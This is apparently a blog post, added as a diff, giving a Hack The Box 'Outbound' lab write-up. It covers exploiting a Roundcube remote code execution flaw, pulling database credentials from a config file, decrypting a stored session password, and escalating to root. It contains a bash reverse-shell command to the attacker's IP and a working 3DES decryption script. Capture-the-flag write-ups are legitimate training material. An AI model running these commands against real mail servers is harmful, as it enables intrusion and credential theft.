@@ -1,0 +1,157 @@
+
+---
+layout: default
+title: "Outbound HTB Writeup"
+date: 2025-07-20 13:54:00 +0300
+categories: [HTBs]
+tags: [cybersecurity, hacking, hackthebox, machines]
+---
+
+# Outbound HTB Writeup
+
+## Importance of This Machine
+
+Hello! Today I want to talk about a machine called **Outbound**. In my opinion, this machine was a great example of how important it is to keep up with cybersecurity news. In June 2025, the mail provider **cock.li** was hacked using a vulnerability identified as **CVE-2025-49113**.
+
+## What is CVE-2025-49113?
+
+**CVE-2025-49113** is an **authenticated remote code execution (RCE)** vulnerability in **Roundcube Webmail**.
+
+## Writeup
+
+### Initial Scanning
+
+I started with an Nmap scan:
+
+```
+
+nmap -sV 10.10.11.77
+
+````
+
+Only two ports were open:
+
+- SSH (22)
+- HTTP (80)
+
+### Exploring the Web Service
+
+When I visited the HTTP port in the browser, I realized I needed to add `mail.outbound.htb` to my `/etc/hosts` file.
+
+After that, accessing the domain revealed a Roundcube login page.
+
+> (I actually remembered this from a previous leak 😅)
+
+According to the information on the [Hack The Box machine page](https://app.hackthebox.com/machines/Outbound), we are given credentials for a user named **tyler**.
+
+---
+
+### Exploiting CVE-2025-49113
+
+I used the public exploit for CVE-2025-49113:
+
+```bash
+wget https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/refs/heads/main/CVE-2025-49113.php
+````
+
+Then ran:
+
+```bash
+php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'sh -i >& /dev/tcp/10.10.14.87/2311 0>&1'"
+```
+
+> ✅ This gave me a shell as the `www` user!
+
+---
+
+### Enumeration
+
+Inside the web directory, I found the Roundcube configuration file:
+
+```bash
+cat /var/www/html/roundcube/config/config.inc.php
+```
+
+It contained MySQL credentials:
+
+```
+Username: roundcube  
+Password: RCDBPass2025
+```
+
+I logged into the database:
+
+```bash
+mysql -u roundcube -pRCDBPass2025 -h localhost roundcube
+```
+
+Then ran:
+
+```sql
+USE roundcube;
+SELECT * FROM session;
+```
+
+This revealed base64-encoded serialized session data. After decoding it, I found:
+
+```
+username|s:5:"jacob";
+password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
+```
+
+---
+
+### Cracking the Password
+
+To decrypt the password, I used the following Python script:
+
+```python
+from Crypto.Cipher import DES3
+from base64 import b64decode
+
+def decrypt_password(encrypted_password, key="rcmail-!24ByteDESkey*Str"):
+    try:
+        des_key = key.encode('utf-8')
+        data = b64decode(encrypted_password)
+        iv = data[:8]
+        ciphertext = data[8:]
+        
+        cipher = DES3.new(des_key, DES3.MODE_CBC, iv=iv)
+        decrypted = cipher.decrypt(ciphertext)
+        
+        return decrypted.rstrip(b"\0").decode('utf-8', errors='ignore')
+        
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+encrypted = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
+print(f"Decrypted password: {decrypt_password(encrypted)}")
+```
+
+**Output:**
+
+```
+Decrypted password: ********
+```
+
+Now, I could log in via SSH using Jacob’s credentials.
+
+---
+
+### Privilege Escalation
+
+Once inside, I ran:
+
+```bash
+sudo -l
+```
+
+I had permission to run a binary called `below`. After some quick research, I found a [privilege escalation exploit](https://github.com/rvizx/CVE-2025-27591) for it.
+
+Running the exploit script gave me **root access**.
+
+---
+
+Thanks for reading! 😄
+Happy hacking!
+
